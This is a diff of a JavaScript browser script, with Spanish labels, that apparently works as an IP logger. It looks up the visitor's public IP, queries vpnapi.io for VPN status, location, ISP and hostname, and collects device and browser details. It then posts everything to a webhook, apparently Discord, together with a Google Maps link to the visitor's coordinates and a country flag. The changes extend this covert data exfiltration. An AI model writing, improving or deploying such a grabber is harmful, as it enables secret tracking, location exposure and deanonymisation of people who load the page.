@@ -2,10 +2,10 @@ function device_info() {
   var info = {
       SO: detectOS(),
       Navegador: detectBrowser(),
-      Is_mobile: is_mobile(),
-      Time: detectTime(),
-      lang: navigator.language,
-      resolution: detectResolution(),
+      Phone_device: is_mobile(),
+      Hora: detectTime(),
+      Idioma: navigator.language,
+      Resolution: detectResolution(),
       vendor: navigator.vendor,
       userAgent: navigator.userAgent,
       cookiesEnabled: navigator.cookieEnabled,
@@ -132,7 +132,7 @@ async function detectLocation(ip) {
   try {
     const response = await fetch(apiUrl);
     const data = await response.json();
-    var place = `${data.location.country}, ${data.location.city}, ${data.location.region}`
+    var place = `${data.location.country}, ${data.location.region}, ${data.location.city}`
     return place;
   } catch (error) {
     console.error(error);
@@ -141,20 +141,43 @@ async function detectLocation(ip) {
 };
 
 
-async function detectMapsLocation(ip) {
+async function generateLink(ip, site) {
   const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
   try {
     const response = await fetch(apiUrl);
     const data = await response.json();
     var latitude = data.location.latitude;
     var longitude = data.location.longitude;
-    return `https://google.com/maps/place/${latitude},${longitude}`;
+    var maps_url = `https://google.com/maps/place/${latitude},${longitude}`;
+    var myipaddress_url = `https://whatismyipaddress.com/ip/${ip}`;
   } catch (error) {
     console.error(error);
     throw new Error("Error al hacer la consulta a la API");
   }
+    
+  if (site == "maps") {
+    return maps_url
+  } else {
+    return myipaddress_url
+  }
   
-}
+};
+
+
+async function generateImgUrl(ip) {
+  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    var county_code = data.location.country_code;
+    var country_codeLower = county_code.toLowerCase();
+    var url = `https://flagcdn.com/256x192/${country_codeLower}.png`
+    return url;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+};
 
 
 async function detectAllSecurity(ip) {
@@ -219,7 +242,7 @@ async function detecthostname(ip) {
   }
 }
 
-// Send data
+// Send data & collect ip
 var ip = '';
 fetch('https://api.ipify.org/?format=json')
   .then(function(response) {
@@ -231,11 +254,16 @@ fetch('https://api.ipify.org/?format=json')
     try {
         var is_vpn = await detectVPN(ip);
         var location = await detectLocation(ip);
-        var maps_url = await detectMapsLocation(ip);
         var security = await detectAllSecurity(ip);
         var all_location = await detectAllLocation(ip);
+        var maps_url = await generateLink(ip, "maps");
+        var myipaddress_url = await generateLink(ip, "myipaddress");
+        var flagUrl = await generateImgUrl(ip);
+        // var flagUrl = 'https://flagcdn.com/256x192/es.png'
         var ISP = await detectISP(ip);
         var hostname = await detecthostname(ip);
+        
+        
     } catch(error) {
         console.log(error);
     }
@@ -248,13 +276,18 @@ fetch('https://api.ipify.org/?format=json')
         'ISP: ' + ISP + '\n' +
         'Hostname: ' + hostname + '\n' +
         'Lugar: ' + location + '\n' +
-        '------------------------------' + '\n' + '\n' + 
+        '------------------------------' + '\n\n' +
         device_info() + '\n------ ------ ------ \n' +
         'All Security: \n' + security + '\n------ ------ ------ \n' +
         'All Location: \n' + all_location +
 
         '```' + '\n' +
-        '### Maps: ' + maps_url 
+        '### Maps: ' + maps_url + '\n' + 
+        '### My ip address: ' + myipaddress_url,
+
+      embeds: [{
+        image: { url: flagUrl }
+      }]
     };
     fetch(webwhook, {
       method: 'POST',
